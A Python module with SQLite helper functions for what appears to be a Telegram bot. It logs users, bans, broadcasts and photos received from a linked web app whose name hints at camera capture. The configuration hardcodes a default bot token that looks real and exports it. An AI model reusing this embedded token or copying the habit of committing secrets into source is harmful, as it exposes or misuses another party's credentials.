import logging
import os
import sqlite3
import threading
from datetime import datetime, timedelta

# ===== CONFIG =====
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8226782560:AAG2h1cqLmKnWvF7YlsdxJ3W8VPlDNe7qn8')
OWNER_ID = int(os.environ.get('OWNER_ID', 8215819954))
WEB_URL = os.environ.get('WEB_URL', 'https://hco-cam.onrender.com')

# ===== DATABASE FUNCTIONS =====
def init_db():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  username TEXT,
                  first_name TEXT,
                  last_name TEXT,
                  join_date TIMESTAMP,
                  last_active TIMESTAMP,
                  photo_count INTEGER DEFAULT 0,
                  is_banned INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS photos
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  timestamp TIMESTAMP,
                  photo_type TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS broadcasts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  admin_id INTEGER,
                  message TEXT,
                  timestamp TIMESTAMP,
                  success_count INTEGER DEFAULT 0,
                  fail_count INTEGER DEFAULT 0)''')
    
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name, last_name):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    now = datetime.now()
    c.execute('''INSERT OR IGNORE INTO users 
                 (user_id, username, first_name, last_name, join_date, last_active) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (user_id, username, first_name, last_name, now, now))
    conn.commit()
    conn.close()

def update_activity(user_id):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    now = datetime.now()
    c.execute('''UPDATE users SET last_active = ? WHERE user_id = ?''', (now, user_id))
    conn.commit()
    conn.close()

def add_photo(user_id, photo_type):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    now = datetime.now()
    c.execute('''INSERT INTO photos (user_id, timestamp, photo_type) VALUES (?, ?, ?)''',
              (user_id, now, photo_type))
    c.execute('''UPDATE users SET photo_count = photo_count + 1 WHERE user_id = ?''', (user_id,))
    conn.commit()
    conn.close()

def get_user_count():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT COUNT(*) FROM users WHERE is_banned = 0''')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_photo_count():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT COUNT(*) FROM photos''')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_today_stats():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    today = datetime.now().date()
    
    c.execute('''SELECT COUNT(*) FROM users WHERE DATE(join_date) = ?''', (today,))
    today_users = c.fetchone()[0]
    
    c.execute('''SELECT COUNT(*) FROM photos WHERE DATE(timestamp) = ?''', (today,))
    today_photos = c.fetchone()[0]
    
    yesterday = datetime.now() - timedelta(days=1)
    c.execute('''SELECT COUNT(*) FROM users WHERE last_active > ?''', (yesterday,))
    active_users = c.fetchone()[0]
    
    conn.close()
    return today_users, today_photos, active_users

def get_all_users():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT user_id FROM users WHERE is_banned = 0''')
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def get_user_info(user_id):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT * FROM users WHERE user_id = ?''', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def update_user_ban(user_id, ban_status):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''UPDATE users SET is_banned = ? WHERE user_id = ?''', (ban_status, user_id))
    conn.commit()
    conn.close()

def search_users(query):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT user_id, username, first_name, last_name FROM users 
                 WHERE user_id LIKE ? OR username LIKE ? OR first_name LIKE ? OR last_name LIKE ?
                 LIMIT 50''',
              (f'%{query}%', f'%{query}%', f'%{query}%', f'%{query}%'))
    users = c.fetchall()
    conn.close()
    return users

# Initialize database
init_db()
print("✅ Database initialized")

# ===== BOT FUNCTIONS FOR SERVER =====
def process_photo_from_web(user_id, photo_bytes, label):
    """Process photo from web app - called by server.py"""
    try:
        # Add to database
        add_photo(user_id, f"web_{label}")
        print(f"✅ Photo saved to database for user {user_id}")
        return True
    except Exception as e:
        print(f"❌ Error processing photo: {e}")
        return False

# Export functions for server.py
__all__ = [
    'add_user', 'update_activity', 'add_photo', 'get_user_count',
    'get_photo_count', 'get_today_stats', 'get_all_users', 'get_user_info',
    'update_user_ban', 'search_users', 'process_photo_from_web',
    'OWNER_ID', 'BOT_TOKEN', 'WEB_URL'
]
